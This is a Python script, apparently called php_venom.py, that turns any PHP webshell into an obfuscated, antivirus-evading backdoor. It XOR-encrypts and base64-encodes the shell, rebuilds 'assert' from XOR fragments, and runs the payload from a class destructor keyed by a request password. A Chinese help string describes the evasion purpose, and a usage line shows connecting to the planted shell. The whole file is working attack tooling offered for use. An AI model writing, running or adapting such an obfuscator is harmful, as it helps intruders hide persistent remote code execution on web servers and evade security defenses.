import random
import base64
import argparse

func = 'assert'
shell_tpl = '''<?php 
class  {0}{2}
${1}=new {0}();
@${1}->ccc=xor_enc(base64_decode('ddd'), $_REQUEST['strpwd']);

'''

php_xor_func = '''
function xor_enc($str,$key)
{
    $crytxt = '';
    $keylen = strlen($key);
    for($i=0;$i<strlen($str);$i++)
    {  
         $k = $i%$keylen;
         $crytxt .= $str[$i] ^ $key[$k];
    }
    return $crytxt;
}
?>
'''


def xor_enc(text, password):
    pwdLen = len(password)
    textLen = len(text)
    key = textLen // pwdLen*password+password[:textLen % pwdLen]
    enc_list = []
    for i in range(len(key)):
        textBytes = bytes(key, "utf8")[i] ^ bytes(text, "utf8")[i]
        enc_list.append(bytes(chr(textBytes), encoding='utf8'))
    enc_data = b''.join(enc_list)
    return enc_data


def encrypt_shell(raw_shell, password):
    tag_start = raw_shell.find('<?php') + 5
    tag_end = raw_shell.rfind('?>', raw_shell.rfind(';'))
    raw_shell = raw_shell[tag_start:tag_end] if tag_end != -1 else raw_shell[tag_start:]
    raw_shell = raw_shell.replace('\\', '\\\\').replace('\'', '\\\'')
    taoke = "eval('{}')".format(raw_shell)
    return base64.b64encode(xor_enc(taoke, password)).decode('utf8')


def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str, len))


def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str, len))


def xor(c1, c2):
    return hex(ord(c1) ^ ord(c2)).replace('0x', r"\x")


def build_func():
    func_line = ''
    name_tmp = []
    for i in range(len(func)):
        name_tmp.append(random_name(3).lower())
    key = random_keys(len(func))
    fina = random_name(4)
    call = '${0}='.format(fina)
    for i in range(0, len(func)):
        enc = xor(func[i], key[i])
        func_line += "${0}='{1}'^\"{2}\";".format(name_tmp[i], key[i], enc)
        func_line += '\n'
        call += '${0}.'.format(name_tmp[i])
    func_line = func_line.rstrip('\n')
    # print(func_line)
    call = call.rstrip('.') + ';'
    func_tmpl = '''{ 
function __destruct(){
%s
%s
return @$%s("$this->ccc");}}''' % (func_line, call, fina)
    return func_tmpl


def build_webshell(raw_shell, password):
    className = random_name(4)
    objName = className.lower()
    func = build_func()
    shellc = shell_tpl.format(className, objName, func).replace(
        'ccc', random_name(2))
    shellc = shellc.replace('ddd', encrypt_shell(raw_shell, password))
    shellc += php_xor_func
    return shellc


if __name__ == '__main__':
    help_msg = '''
Usage: python3 php_venom.py -f shell.php -o bypass_shell.php -p mypass
Connect: http://xxx.com/bypass_shell.php?strpwd=mypass
    '''
    parser = argparse.ArgumentParser(description='免杀不包含内联HTML的php脚本，仅对php7.1以下版本有效（不包含7.1版本）' +
                                     help_msg, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-f', '--file', help='php file needs to bypass.')
    parser.add_argument('-o', '--outfile', help='output file.')
    parser.add_argument('-p', '--password',
                        help='password for encrypting shell')
    args = parser.parse_args()
    import sys
    if len(sys.argv) < 2:
        # print(help_msg)
        parser.print_help()
        sys.exit(1)
    with open(args.file, 'r', encoding='utf8') as f:
        raw_shell = f.read()
    with open(args.outfile, 'w', encoding='utf8') as f:
        f.write(build_webshell(raw_shell, args.password))
